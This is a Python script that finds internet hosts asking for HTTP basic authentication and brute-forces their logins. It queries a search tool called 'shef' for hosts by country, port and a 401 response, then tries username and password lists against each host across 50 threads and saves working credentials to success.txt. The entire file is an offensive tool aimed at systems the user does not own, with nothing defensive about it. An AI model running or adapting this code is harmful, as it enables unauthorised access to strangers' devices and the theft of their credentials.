import os
import shutil
import requests
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
import subprocess
import time

# Logging configuration
logging.basicConfig(filename="errors.log", level=logging.ERROR, format="%(asctime)s - %(levelname)s - %(message)s")

# Configuration
PORTS_FILE = "ports.txt"
FILES_TO_COPY = ["passwd.txt", "users.txt"]
HTTPBRUTE_DIR = "httpbrute"
PORTS_DIR = "ports"
DELAY_AFTER = 5
DELAY_SECONDS = 3
MAX_CONCURRENT_PORTS = 50
TIMEOUT = 4
SUCCESS_FILE = "success.txt"

# Ensure the base directory for ports exists
os.makedirs(PORTS_DIR, exist_ok=True)

def load_ports():
    try:
        with open(PORTS_FILE, "r") as file:
            return [line.strip() for line in file if line.strip().isdigit()]
    except FileNotFoundError:
        print(f"Error: {PORTS_FILE} not found.")
        exit(1)

def run_shef_for_port(port):
    port_dir = os.path.join(PORTS_DIR, f"port_{port}")
    host_file = os.path.join(port_dir, f"{port}_hosts.txt")

    if os.path.exists(host_file):
        print(f"Port {port}: Host file already exists. Skipping shef.")
        return

    os.makedirs(port_dir, exist_ok=True)
    temp_output_file = os.path.join(port_dir, "shef_raw_output.txt")

    try:
        print(f"Port {port}: Running `shef` to retrieve hosts.")
        with open(temp_output_file, "w") as temp_file:
            subprocess.run(
                ["shef", "-q", f"country:<change> '401' port:{port}"],    ### Make you own prompt
                stdout=temp_file, check=True
            )

        # Parse the `shef` output to create host entries
        with open(temp_output_file, "r") as temp_file, open(host_file, "w") as host_file_output:
            for line in temp_file:
                ip = line.strip()
                if ip:
                    host_file_output.write(f"{ip}:{port}\n")

        # Copy credential files to the port directory
        for file in FILES_TO_COPY:
            source_path = os.path.join(HTTPBRUTE_DIR, file)
            destination_path = os.path.join(port_dir, file)
            shutil.copy(source_path, destination_path)

    except subprocess.CalledProcessError as e:
        logging.error(f"Error running shef for port {port}: {e}")
    except Exception as e:
        logging.error(f"Error processing shef output for port {port}: {e}")

def process_shef_with_delay(ports):
    for counter, port in enumerate(ports, start=1):
        run_shef_for_port(port)
        if counter % DELAY_AFTER == 0 and counter < len(ports):
            print(f"Pausing for {DELAY_SECONDS} seconds...")
            time.sleep(DELAY_SECONDS)

def brute_force_host(host, user_list, pass_list):
    try:
        with open(user_list, "r") as ul, open(pass_list, "r") as pl:
            for username in ul:
                username = username.strip()
                for password in pl:
                    password = password.strip()
                    url = f"http://{host}"
                    print(f"Trying {username}:{password} on {url}")
                    try:
                        response = requests.get(url, auth=(username, password), timeout=TIMEOUT)
                        if response.status_code == 200:
                            print(f"[SUCCESS] Found valid credentials for {host} - {username}:{password}")
                            with open(SUCCESS_FILE, "a") as sf:
                                sf.write(f"{host} - {username}:{password}\n")
                            return True  # Stop further attempts for this host
                        elif response.status_code == 401:
                            # Explicitly handle unauthorized responses
                            continue
                        else:
                            logging.info(f"Unexpected HTTP status for {url}: {response.status_code}")
                    except requests.exceptions.RequestException as e:
                        logging.error(f"Request error for {url}: {e}")
    except Exception as e:
        logging.error(f"Error brute-forcing {host}: {e}")
    return False

def brute_force_port(port):
    port_dir = os.path.join(PORTS_DIR, f"port_{port}")
    host_file = os.path.join(port_dir, f"{port}_hosts.txt")
    user_list = os.path.join(port_dir, "users.txt")
    pass_list = os.path.join(port_dir, "passwd.txt")

    if not os.path.exists(host_file):
        logging.error(f"Host file for port {port} does not exist. Skipping.")
        return

    try:
        with open(host_file, "r") as hf:
            for line in hf:
                host = line.strip()
                brute_force_host(host, user_list, pass_list)
    except Exception as e:
        logging.error(f"Error processing hosts for port {port}: {e}")

def run_brute_force_dynamically(ports):
    with ThreadPoolExecutor(max_workers=MAX_CONCURRENT_PORTS) as executor:
        futures = {executor.submit(brute_force_port, port): port for port in ports}
        for future in as_completed(futures):
            port = futures[future]
            try:
                future.result()
                print(f"Brute force completed for port {port}.")
            except Exception as e:
                logging.error(f"Error in brute force task for port {port}: {e}")

if __name__ == "__main__":
    ports = load_ports()
    print("Starting shef processing for all ports...")
    process_shef_with_delay(ports)
    print("Shef processing completed.")

    print("Starting brute force attacks for all ports...")
    run_brute_force_dynamically(ports)
    print("Brute force operations completed.")
